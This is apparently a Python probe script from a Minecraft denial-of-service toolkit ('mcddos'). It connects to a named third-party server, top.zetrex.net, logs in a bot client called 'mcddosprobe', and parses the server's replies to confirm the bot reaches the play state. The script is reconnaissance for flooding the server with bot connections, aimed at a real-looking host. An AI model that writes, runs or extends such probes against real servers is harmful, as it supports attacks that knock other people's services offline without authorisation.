import socket, sys, select, time, zlib
sys.path.insert(0,'.')
from mcddos import protocol as mc
HOST='top.zetrex.net'; P=767
s = socket.create_connection((HOST,25565), timeout=15)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
hs = mc.handshake_payload(P, HOST, 25565, 2)
s.sendall(mc.varint(len(hs)+1)+mc.varint(0)+hs)
ls = mc.varint(0)+mc.str_field('mcddosprobe')+b'\x00'*16
s.sendall(mc.varint(len(ls))+ls)
s.settimeout(8)

def read_avail(t=8):
    buf=b''
    t0=time.time()
    while time.time()-t0 < t:
        r,_,_=select.select([s],[],[],1.0)
        if r:
            try: ch=s.recv(65536)
            except Exception as e: print('recv exc',e); break
            if not ch: break
            buf+=ch
    return buf

def parse_frames(buf):
    frames=[]; pos=0
    while pos < len(buf):
        b=buf[pos]; ln=b&0x7F; sh=7; p1=pos+1
        while b&0x80:
            if p1>=len(buf): break
            b=buf[p1]; ln|=(b&0x7F)<<sh; sh+=7; p1+=1
        if p1>=len(buf): break
        if p1+ln>len(buf): break
        frames.append(buf[p1:p1+ln]); pos=p1+ln
    return frames

print('== after login_start ==')
buf=read_avail()
print('bytes:',len(buf),'hex:',buf.hex())
for f in parse_frames(buf):
    pid=mc.Reader(f,P).read_varint()
    print('  frame pid=',pid,'len=',len(f))
    if pid==2:  # login_success
        r2=mc.Reader(f,P)
        try:
            uuid=r2.read_bytes(16)
            nm=r2.read_string()
            print('   SUCCESS uuid=',uuid.hex(),'name=',nm)
        except Exception as e:
            print('   parse err',e,'hex=',f.hex())
        # send login_ack (765+: id 3)
        s.sendall(mc.varint(3))
        print('   sent login_ack')
        time.sleep(1)
        buf2=read_avail(10)
        print('after ack bytes:',len(buf2),'hex:',buf2.hex()[:200])
        for f2 in parse_frames(buf2):
            pid2=mc.Reader(f2,P).read_varint()
            print('  frame pid=',pid2,'len=',len(f2))
            if pid2==3:
                r=mc.Reader(f2,P); thr=r.read_varint(); print('   COMPRESS threshold',thr)
            elif pid2==36:
                print('   KEEP_ALIVE (play!)', f2.hex())
            elif pid2==41:
                print('   JOIN_GAME/SpawnInfo -> PLAY!')
